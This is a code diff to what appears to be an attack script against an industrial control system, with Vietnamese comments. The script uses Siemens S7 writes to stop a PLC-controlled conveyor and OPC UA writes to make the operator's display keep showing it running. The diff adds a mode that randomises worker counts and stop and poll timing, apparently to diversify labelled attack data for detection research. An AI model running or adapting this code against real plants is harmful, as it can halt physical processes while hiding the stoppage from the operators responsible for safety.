@@ -50,6 +50,8 @@ Goi tu bash:
 """
 
 import asyncio
+import os
+import random
 import threading
 import time
 from attacks_ext.config_ext import base_parser, write_label
@@ -64,9 +66,14 @@ from snap7.util import get_bool, set_bool, get_dint
 from asyncua import Client, ua
 
 BANGTAI_NODE_ID = 'ns=3;s="BangTai"'
-CONCEAL_WORKERS = 5  # so luong task ghi CHAY SONG SONG tren cung 1 OPC UA session
-                      # (tan dung pipelining -- nhieu WriteRequest cho phan hoi
-                      # xen ke nhau, thay vi 1 luong tuan tu cho tung cai)
+_DIVERSE = os.environ.get("ATTACK_PROFILE", "standard") == "diverse_mix"
+# ATTACK_PROFILE=diverse_mix: da dang hoa so worker + nhip poll/STOP-hold
+# trong bien do AN TOAN, gan voi gia tri goc da kiem chung (5 worker, STOP
+# giu 6s) -- KHONG dong cham logic probe-truoc-khi-tan-cong hay restore.
+CONCEAL_WORKERS = random.randint(2, 8) if _DIVERSE else 5  # so luong task ghi
+                      # CHAY SONG SONG tren cung 1 OPC UA session (tan dung
+                      # pipelining -- nhieu WriteRequest cho phan hoi xen ke
+                      # nhau, thay vi 1 luong tuan tu cho tung cai)
 SAMPLE_INTERVAL_S = 0.05  # tan suat doc lai de do ty le "dinh" (tach rieng
                            # khoi vong ghi chinh de khong lam cham no)
 
@@ -219,7 +226,7 @@ def s7_attack_loop(args, result: dict) -> None:
                 stop_count += 1
                 print(f"  [{stop_count}] STOP that (CD1={cd1}ms) + concealment ON (dang ghi lai BangTai=True qua OPC UA)")
 
-                time.sleep(6)
+                time.sleep(random.uniform(4.0, 10.0) if _DIVERSE else 6)
 
                 m5 = client.read_area(Areas.MK, 0, 5, 1)
                 set_bool(m5, 0, 1, False)
@@ -229,7 +236,7 @@ def s7_attack_loop(args, result: dict) -> None:
                 concealment_active.clear()
                 print(f"  [{stop_count}] Restart that -- concealment OFF")
 
-            time.sleep(2)
+            time.sleep(random.uniform(1.0, 4.0) if _DIVERSE else 2)
 
     except Exception as e:
         print(f"[ERR] S7 loop: {e}")
